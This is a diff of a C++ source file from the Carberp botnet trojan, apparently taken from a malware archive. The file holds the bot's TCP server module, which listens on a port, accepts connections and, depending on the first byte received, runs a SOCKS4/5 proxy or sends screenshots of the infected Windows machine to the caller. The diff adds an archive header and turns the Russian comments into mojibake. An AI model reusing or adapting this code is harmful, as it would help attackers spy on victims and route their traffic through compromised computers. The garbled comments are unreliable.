@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <ws2tcpip.h>
 #include <windows.h>
 #include <shlwapi.h>
@@ -18,22 +29,22 @@
 #include "..\common\process.h"
 #include "..\common\sync.h"
 
-//Данные сокета.
+//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 typedef struct
 {
-  SOCKET s;     //Сокет.
-  HANDLE event; //Событие FD_ACCEPT.
+  SOCKET s;     //пїЅпїЅпїЅпїЅпїЅ.
+  HANDLE event; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ FD_ACCEPT.
 }SOCKETDATA;
 
 /*
-  Заполнение структуры SOCKETDATA.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ SOCKETDATA.
 
-  IN family - AF_INET или AF_INET6.
-  IN port   - порт. Если равен 0, то выбирается произволный порт.
+  IN family - AF_INET пїЅпїЅпїЅ AF_INET6.
+  IN port   - пїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ 0, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
   OUT sd    - SOCKETDATA.
 
-  Return    - true - в случаи успеха,
-              false - в случаи ошибки.
+  Return    - true - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+              false - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool createSocketData(int family, WORD port, SOCKETDATA *sd)
 {
@@ -60,7 +71,7 @@ static bool createSocketData(int family, WORD port, SOCKETDATA *sd)
 }
 
 /*
-  Удаление ресурсов занятых SOCKETDATA.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ SOCKETDATA.
 
   IN sd - SOCKETDATA.
 */
@@ -71,13 +82,13 @@ static void freeSocketData(SOCKETDATA *sd)
 }
 
 /*
-  Создание сокета для прослущивания на произволном порту.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 
-  IN initialPort - предпочитаемый порт, или 0 для произволного.
-  OUT ipv4Data   - IPv4-сокет.
-  OUT ipv6Data   - IPv6-сокет.
+  IN initialPort - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ 0 пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+  OUT ipv4Data   - IPv4-пїЅпїЅпїЅпїЅпїЅ.
+  OUT ipv6Data   - IPv6-пїЅпїЅпїЅпїЅпїЅ.
 
-  Return         - номер порта, на котором удалось влючить прослушивание. Или 0 в случаи ошибки.
+  Return         - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅ 0 пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static WORD createListenSocket(WORD initialPort, SOCKETDATA *ipv4Data, SOCKETDATA *ipv6Data)
 {
@@ -123,9 +134,9 @@ void TcpServer::uninit(void)
 ////////////////////////////////////////////////////////////////////////////////////////////////////
 
 /*
-  Поток для работы с S1 сессией.
+  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ S1 пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN p   - сокет сессии.
+  IN p   - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
   
   Return - 0.
 */
@@ -138,25 +149,25 @@ static DWORD WINAPI s1Proc(void *p)
   
   WDEBUG0(WDDT_INFO, "Started."); 
   
-  //Узнаем по первому байту, что от нас хотят.
+  //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
   if(WSocket::tcpRecv(s, &magicByte, 1, 0) == 1)switch(magicByte)
   {
-    //Сокс 5.
+    //пїЅпїЅпїЅпїЅ 5.
     case 5:
       Socks5Server::_start5(s, 0);
       break;
 
-    //Сокс 4.
+    //пїЅпїЅпїЅпїЅ 4.
     case 4:
       Socks5Server::_start4(s, 0);
       break;
     
-    //Скриншот.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
     case 0:
     {
       WDEBUG0(WDDT_INFO, "Is screenshot session"); 
       
-      //Читаем MIME.
+      //пїЅпїЅпїЅпїЅпїЅпїЅ MIME.
       BYTE quality;
       BYTE mimeSize;
 
@@ -168,7 +179,7 @@ static DWORD WINAPI s1Proc(void *p)
           LPWSTR realMime = Str::_utf8ToUnicode(mime, mimeSize);
           if(realMime != NULL)
           {
-            //Отправляем скриншот.
+            //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
             Screenshoot::_screenToSocket(s, realMime, quality, 0);
             Mem::free(realMime);
           }
@@ -184,7 +195,7 @@ static DWORD WINAPI s1Proc(void *p)
 }
 
 /*
-  Поток для принятия соединений.
+  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
   Return - 0.
 */
@@ -204,7 +215,7 @@ static DWORD WINAPI proc(void *)
     LocalSettings::SETTINGS ls;
     LocalSettings::getCurrent(&ls);
 
-    //Принудительно пытаемся создать сокеты.
+    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
     SOCKETDATA s1Ipv4, s1Ipv6;
     WORD currentPort;
     while((currentPort = createListenSocket(ls.tcpPortS1, &s1Ipv4, &s1Ipv6)) == 0)
@@ -212,9 +223,9 @@ static DWORD WINAPI proc(void *)
       if(CWA(kernel32, WaitForSingleObject)(coreData.globalHandles.stopEvent, 1000) != WAIT_TIMEOUT)break;
     }
 
-    if(currentPort != 0) //Иначе сработало coreData.globalHandles.stopEvent.
+    if(currentPort != 0) //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ coreData.globalHandles.stopEvent.
     {
-      //Если порт был изменен, сохраняем его.
+      //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ.
       if(currentPort != ls.tcpPortS1)
       {
         LocalSettings::beginReadWrite(&ls);
@@ -222,7 +233,7 @@ static DWORD WINAPI proc(void *)
         LocalSettings::endReadWrite(&ls);
       }
 
-      //Создаем карту событий.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       HANDLE events[3];
       DWORD eventsCount = 0;
       {
@@ -231,27 +242,27 @@ static DWORD WINAPI proc(void *)
         if(s1Ipv6.event != NULL)events[eventsCount++] = s1Ipv6.event;
       }
       
-      //Ждем событий.
+      //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       DWORD curEvent;
-      while((curEvent = CWA(kernel32, WaitForMultipleObjects)(eventsCount, events, FALSE, INFINITE)) > WAIT_OBJECT_0 /*Т.е. пропускаем stopEvent*/ &&
+      while((curEvent = CWA(kernel32, WaitForMultipleObjects)(eventsCount, events, FALSE, INFINITE)) > WAIT_OBJECT_0 /*пїЅ.пїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ stopEvent*/ &&
             curEvent < WAIT_OBJECT_0 + eventsCount)
       {
         curEvent -= WAIT_OBJECT_0;
         
-        //Определяем сокет.
+        //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
         SOCKET clientSocket, incomingSocket;
         if(events[curEvent] == s1Ipv4.event)incomingSocket = s1Ipv4.s;
         else if(events[curEvent] == s1Ipv6.event)incomingSocket = s1Ipv6.s;
         
-        //Принимаем соединение на сокете.
+        //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
         while((clientSocket = CWA(ws2_32, accept)(incomingSocket, NULL, NULL)) != INVALID_SOCKET)
         {
-          //Настраиваем сокет.
+          //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
           CWA(ws2_32, WSAEventSelect)(clientSocket, NULL, 0);
           WSocket::setNonBlockingMode(clientSocket, false);
           WSocket::tcpDisableDelay(clientSocket, true);
           
-          //Создаем поток сессии.
+          //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
           if(Process::_createThread(128 * 1024, s1Proc, (void *)clientSocket) == 0)
           {
             WDEBUG0(WDDT_ERROR, "Failed to create thread.");
@@ -260,7 +271,7 @@ static DWORD WINAPI proc(void *)
         }
       }
 
-      //Освобождаем ресурсы.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       freeSocketData(&s1Ipv4);
       freeSocketData(&s1Ipv6);
     }
